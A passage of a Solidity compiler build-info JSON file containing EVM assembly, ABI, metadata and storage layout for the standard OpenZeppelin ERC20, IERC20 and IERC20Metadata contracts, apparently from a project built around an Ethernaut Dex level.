											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 2091,
											"end": 2351,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 2091,
											"end": 2351,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 2356,
											"end": 2736,
											"name": "tag",
											"source": 5,
											"value": "65"
										},
										{
											"begin": 2356,
											"end": 2736,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2435,
											"end": 2436,
											"name": "PUSH",
											"source": 5,
											"value": "1"
										},
										{
											"begin": 2431,
											"end": 2443,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 2431,
											"end": 2443,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 2431,
											"end": 2443,
											"name": "SHR",
											"source": 5
										},
										{
											"begin": 2431,
											"end": 2443,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 2478,
											"end": 2490,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 2478,
											"end": 2490,
											"name": "AND",
											"source": 5
										},
										{
											"begin": 2478,
											"end": 2490,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 2499,
											"end": 2560,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "166"
										},
										{
											"begin": 2499,
											"end": 2560,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 2553,
											"end": 2557,
											"name": "PUSH",
											"source": 5,
											"value": "7F"
										},
										{
											"begin": 2545,
											"end": 2551,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 2541,
											"end": 2558,
											"name": "AND",
											"source": 5
										},
										{
											"begin": 2531,
											"end": 2558,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 2531,
											"end": 2558,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 2499,
											"end": 2560,
											"name": "tag",
											"source": 5,
											"value": "166"
										},
										{
											"begin": 2499,
											"end": 2560,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2606,
											"end": 2608,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 2598,
											"end": 2604,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 2595,
											"end": 2609,
											"name": "LT",
											"source": 5
										},
										{
											"begin": 2575,
											"end": 2593,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 2572,
											"end": 2610,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 2569,
											"end": 2730,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "167"
										},
										{
											"begin": 2569,
											"end": 2730,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 2652,
											"end": 2662,
											"name": "PUSH",
											"source": 5,
											"value": "4E487B71"
										},
										{
											"begin": 2647,
											"end": 2650,
											"name": "PUSH",
											"source": 5,
											"value": "E0"
										},
										{
											"begin": 2643,
											"end": 2663,
											"name": "SHL",
											"source": 5
										},
										{
											"begin": 2640,
											"end": 2641,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2633,
											"end": 2664,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 2687,
											"end": 2691,
											"name": "PUSH",
											"source": 5,
											"value": "22"
										},
										{
											"begin": 2684,
											"end": 2685,
											"name": "PUSH",
											"source": 5,
											"value": "4"
										},
										{
											"begin": 2677,
											"end": 2692,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 2715,
											"end": 2719,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 2712,
											"end": 2713,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 2569,
											"end": 2730,
											"name": "tag",
											"source": 5,
											"value": "167"
										},
										{
											"begin": 2569,
											"end": 2730,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2569,
											"end": 2730,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 2356,
											"end": 2736,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 2356,
											"end": 2736,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 2356,
											"end": 2736,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 2356,
											"end": 2736,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 2741,
											"end": 2963,
											"name": "tag",
											"source": 5,
											"value": "88"
										},
										{
											"begin": 2741,
											"end": 2963,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2806,
											"end": 2815,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 2806,
											"end": 2815,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 2806,
											"end": 2815,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 2827,
											"end": 2837,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 2827,
											"end": 2837,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 2827,
											"end": 2837,
											"name": "GT",
											"source": 5
										},
										{
											"begin": 2824,
											"end": 2957,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 2824,
											"end": 2957,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "70"
										},
										{
											"begin": 2824,
											"end": 2957,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 2879,
											"end": 2889,
											"name": "PUSH",
											"source": 5,
											"value": "4E487B71"
										},
										{
											"begin": 2874,
											"end": 2877,
											"name": "PUSH",
											"source": 5,
											"value": "E0"
										},
										{
											"begin": 2870,
											"end": 2890,
											"name": "SHL",
											"source": 5
										},
										{
											"begin": 2867,
											"end": 2868,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2860,
											"end": 2891,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 2914,
											"end": 2918,
											"name": "PUSH",
											"source": 5,
											"value": "11"
										},
										{
											"begin": 2911,
											"end": 2912,
											"name": "PUSH",
											"source": 5,
											"value": "4"
										},
										{
											"begin": 2904,
											"end": 2919,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 2942,
											"end": 2946,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 2939,
											"end": 2940,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2932,
											"end": 2947,
											"name": "REVERT",
											"source": 5
										}
									]
								}
							},
							"sourceList": [
								"@openzeppelin/contracts/token/ERC20/ERC20.sol",
								"@openzeppelin/contracts/token/ERC20/IERC20.sol",
								"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol",
								"@openzeppelin/contracts/utils/Context.sol",
								"ethernaut/Dex.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"decreaseAllowance(address,uint256)": "a457c2d7",
							"increaseAllowance(address,uint256)": "39509351",
							"name()": "06fdde03",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. For a generic mechanism see {ERC20PresetMinterPauser}. TIP: For a detailed writeup see our guide https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. The default value of {decimals} is 18. To change this, you should override this function so it returns a different value. We have followed general OpenZeppelin Contracts guidelines: functions revert instead returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications. Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification. Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"See {IERC20-allowance}.\"},\"approve(address,uint256)\":{\"details\":\"See {IERC20-approve}. NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address.\"},\"balanceOf(address)\":{\"details\":\"See {IERC20-balanceOf}.\"},\"constructor\":{\"details\":\"Sets the values for {name} and {symbol}. All two of these values are immutable: they can only be set once during construction.\"},\"decimals()\":{\"details\":\"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}.\"},\"decreaseAllowance(address,uint256)\":{\"details\":\"Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`.\"},\"increaseAllowance(address,uint256)\":{\"details\":\"Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token, usually a shorter version of the name.\"},\"totalSupply()\":{\"details\":\"See {IERC20-totalSupply}.\"},\"transfer(address,uint256)\":{\"details\":\"See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `amount`.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `amount`. - the caller must have allowance for ``from``'s tokens of at least `amount`.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":\"ERC20\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0xa56ca923f70c1748830700250b19c61b70db9a683516dc5e216694a50445d99c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://cac938788bc4be12101e59d45588b4e059579f4e61062e1cda8d6b06c0191b15\",\"dweb:/ipfs/QmV2JKCyjTVH3rkWNrfdJRhAT7tZ3usAN2XcnD4h53Mvih\"]},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd\",\"dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8\"]},\"@openzeppelin/contracts/utils/Context.sol\":{\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92\",\"dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 15,
								"contract": "@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20",
								"label": "_balances",
								"offset": 0,
								"slot": "0",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 21,
								"contract": "@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20",
								"label": "_allowances",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 23,
								"contract": "@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20",
								"label": "_totalSupply",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							},
							{
								"astId": 25,
								"contract": "@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20",
								"label": "_name",
								"offset": 0,
								"slot": "3",
								"type": "t_string_storage"
							},
							{
								"astId": 27,
								"contract": "@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20",
								"label": "_symbol",
								"offset": 0,
								"slot": "4",
								"type": "t_string_storage"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface of the ERC20 standard as defined in the EIP.",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the amount of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the amount of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC20 standard as defined in the EIP.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the amount of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the amount of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
				"IERC20Metadata": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
